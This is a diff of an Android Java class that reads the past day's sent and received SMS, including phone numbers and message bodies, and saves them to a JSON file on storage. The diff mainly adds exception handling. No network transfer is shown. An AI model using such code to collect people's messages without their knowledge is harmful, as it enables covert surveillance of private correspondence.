@@ -49,119 +49,121 @@ public class ReadSms {
      */
 
     private List<AdapterData> massAllSMS (String send, String inbox){
-
+        List<AdapterData> sent_buf = null;
+        try{
         Uri uri_send = Uri.parse(send);
-        //readSms(uri_send);
         Uri uri_inbox = Uri.parse(inbox);
 
-        List<AdapterData> sent_buf = new ArrayList<AdapterData>(readSmsSend(uri_send));
+        sent_buf = new ArrayList<AdapterData>(readSmsSend(uri_send));
         sent_buf.addAll(readSmsInbox(uri_inbox));
 /**сортируем массив смс по телефону и дате*/
         Collections.sort(sent_buf, new SortByPhoNumber());
-
-        for (AdapterData buf:sent_buf) {
-            Log.i(Msg, " id: " + buf.getId());
-            Log.i(Msg, " address: " + buf.getAddress());
-            Log.i(Msg, " msg: " + buf.getMsg());
-            Long buf_data = Long.parseLong(buf.getTime());
-            Log.i(Msg, " date: " + new SimpleDateFormat("yyyy_MM_dd_HH-mm-ss").format(buf_data));
-        }
+        } catch (Exception e) {Log.i(Msg, "Error ReadSms massAllSMS " + e);}
         return sent_buf;
     }
+    //входящие сообщения
     private List<AdapterData> readSmsInbox(Uri uri) {
+        List<AdapterData> sms = null;
+        try {
+            ContentResolver cr = contentResolver;
+            Calendar currentDate = Calendar.getInstance();
 
-        ContentResolver cr = contentResolver;
-        Calendar currentDate = Calendar.getInstance();
+            Long end_date = currentDate.getTimeInMillis();// текущаяя дата  получаем полную дату 14 цыфр в БД делить на 1000 не нужно
+            Long start_date = end_date - (24 * 60 * 60 * 1000);
+            String[] date_query = {start_date.toString(), end_date.toString()};
+            String[] projection = {id, address, date, body};
 
-        Long end_date =  currentDate.getTimeInMillis();// текущаяя дата  получаем полную дату 14 цыфр в БД делить на 1000 не нужно
-        Long start_date = end_date - (24*60*60*1000);
-        String[] date_query = {start_date.toString(), end_date.toString()};
-        String[] projection = { id, address, date, body};
+            Cursor cur = cr.query(uri, projection, DATE_COLUMN_NAME, date_query, null);
+            int cur_count = cur.getCount();
 
-        Cursor cur = cr.query(uri, projection, DATE_COLUMN_NAME, date_query, null);
-        int cur_count = cur.getCount();
+            sms = new ArrayList<AdapterData>();
+            AdapterData sms_ob;
 
-        List<AdapterData> sms = new ArrayList<AdapterData>();
-        AdapterData sms_ob;
+            // Read the sms data and store it in the list
+            if (cur.moveToFirst()) {
+                for (int i = 0; i < cur_count; i++) {
 
-        // Read the sms data and store it in the list
-        if (cur.moveToFirst()) {
-            for (int i = 0; i < cur_count; i++) {
+                    sms_ob = new AdapterData();
 
-                sms_ob = new AdapterData();
+                    sms_ob.setAddress(cur.getString(cur.getColumnIndexOrThrow(address)).toString());
+                    sms_ob.setMsg("Полученное : " + cur.getString(cur.getColumnIndexOrThrow(body)).toString()); //текст смс
+                    sms_ob.setTime(cur.getString(cur.getColumnIndexOrThrow(date)).toString());
+                    sms_ob.setId(cur.getString(cur.getColumnIndexOrThrow(id)));
+                    sms.add(sms_ob);
 
-                sms_ob.setAddress(cur.getString(cur.getColumnIndexOrThrow(address)).toString());
-                sms_ob.setMsg("Полученное : " + cur.getString(cur.getColumnIndexOrThrow(body)).toString()); //текст смс
-                sms_ob.setTime(cur.getString(cur.getColumnIndexOrThrow(date)).toString());
-                sms_ob.setId(cur.getString(cur.getColumnIndexOrThrow(id)));
-                sms.add(sms_ob);
-
-                cur.moveToNext();
+                    cur.moveToNext();
+                }
             }
-        }
-        cur.close();
+            cur.close();
+        }   catch (Exception e) {Log.i(Msg, "Error ReadSms readSmsInbox " + e);}
         return sms;
     }
+    //исходящие сообщения
     private List<AdapterData> readSmsSend(Uri uri) {
+        List<AdapterData> sms = null;
+        try {
+            ContentResolver cr = contentResolver;
+            Calendar currentDate = Calendar.getInstance();
 
-        ContentResolver cr = contentResolver;
-        Calendar currentDate = Calendar.getInstance();
+            Long end_date = currentDate.getTimeInMillis();// текущаяя дата  получаем полную дату 14 цыфр в БД делить на 1000 не нужно
+            Long start_date = end_date - (24 * 60 * 60 * 1000);
+            String[] date_query = {start_date.toString(), end_date.toString()};
+            String[] projection = {id, address, date, body};
 
-        Long end_date =  currentDate.getTimeInMillis();// текущаяя дата  получаем полную дату 14 цыфр в БД делить на 1000 не нужно
-        Long start_date = end_date - (24*60*60*1000);
-        String[] date_query = {start_date.toString(), end_date.toString()};
-        String[] projection = { id, address, date, body};
+            Cursor cur = cr.query(uri, projection, DATE_COLUMN_NAME, date_query, null);
+            int cur_count = cur.getCount();
 
-        Cursor cur = cr.query(uri, projection, DATE_COLUMN_NAME, date_query, null);
-        int cur_count = cur.getCount();
+            sms = new ArrayList<AdapterData>();
+            AdapterData sms_ob;
 
-        List<AdapterData> sms = new ArrayList<AdapterData>();
-        AdapterData sms_ob;
+            // Read the sms data and store it in the list
+            if (cur.moveToFirst()) {
+                for (int i = 0; i < cur_count; i++) {
 
-        // Read the sms data and store it in the list
-        if (cur.moveToFirst()) {
-            for (int i = 0; i < cur_count; i++) {
+                    sms_ob = new AdapterData();
 
-                sms_ob = new AdapterData();
+                    sms_ob.setAddress(cur.getString(cur.getColumnIndexOrThrow(address)).toString());
+                    sms_ob.setMsg("Отправленное : " + cur.getString(cur.getColumnIndexOrThrow(body)).toString()); //текст смс
+                    sms_ob.setTime(cur.getString(cur.getColumnIndexOrThrow(date)).toString());
+                    sms_ob.setId(cur.getString(cur.getColumnIndexOrThrow(id)));
+                    sms.add(sms_ob);
 
-                sms_ob.setAddress(cur.getString(cur.getColumnIndexOrThrow(address)).toString());
-                sms_ob.setMsg("Отправленное : " + cur.getString(cur.getColumnIndexOrThrow(body)).toString()); //текст смс
-                sms_ob.setTime(cur.getString(cur.getColumnIndexOrThrow(date)).toString());
-                sms_ob.setId(cur.getString(cur.getColumnIndexOrThrow(id)));
-                sms.add(sms_ob);
-
-                cur.moveToNext();
+                    cur.moveToNext();
+                }
             }
-        }
-        cur.close();
+            cur.close();
+        }   catch (Exception e) {Log.i(Msg, "Error ReadSms readSmsSend " + e);}
         return sms;
     }
+    //создаем файл с SMS и сохраняем в памяти приложения в формате json
     public void smsToJson (){
-        WriteToJsonFile writeToFile = new WriteToJsonFile(context);
-        String uri_send_sms = "content://sms/sent";
-        String uri_inbox_sms = "content://sms/inbox";
-        JSONObject sms = new JSONObject();//Заголовок
-        JSONObject body;
-        JSONArray mass = new JSONArray();
-        Long time_bufer;
-        for(AdapterData date : massAllSMS(uri_send_sms, uri_inbox_sms)){
-            body = new JSONObject();
+        try {
+            WriteToJsonFile writeToFile = new WriteToJsonFile(context);
+            String uri_send_sms = "content://sms/sent";
+            String uri_inbox_sms = "content://sms/inbox";
+            JSONObject sms = new JSONObject();//Заголовок
+            JSONObject body;
+            JSONArray mass = new JSONArray();
+            Long time_bufer;
+            for (AdapterData date : massAllSMS(uri_send_sms, uri_inbox_sms)) {
+                body = new JSONObject();
+                try {
+                    body.put("Phone", date.getAddress());
+                    body.put("Message", date.getMsg());
+                    time_bufer = Long.parseLong(date.getTime());//В читабельный формат - дату
+                    body.put("Time", new SimpleDateFormat("yyyy_MM_dd_HH-mm-ss")
+                            .format(time_bufer));
+                    mass.put(body);
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+            }
             try {
-                body.put("Phone", date.getAddress());
-                body.put("Message", date.getMsg());
-                time_bufer = Long.parseLong( date.getTime());//В читабельный формат - дату
-                body.put("Time", new SimpleDateFormat("yyyy_MM_dd_HH-mm-ss")
-                        .format(time_bufer));
-                mass.put(body);
+                sms.put("SMS", mass);
             } catch (JSONException e) {
                 e.printStackTrace();
             }
-        }
-        try {
-            sms.put("SMS", mass);
-        } catch (JSONException e) {
-            e.printStackTrace();
-        }
-        writeToFile.writeFileSD(sms, fileName, folder);
+            writeToFile.writeFileSD(sms, fileName, folder);
+        }   catch (Exception e) {Log.i(Msg, "Error ReadSms smsToJson " + e);}
     }
 }
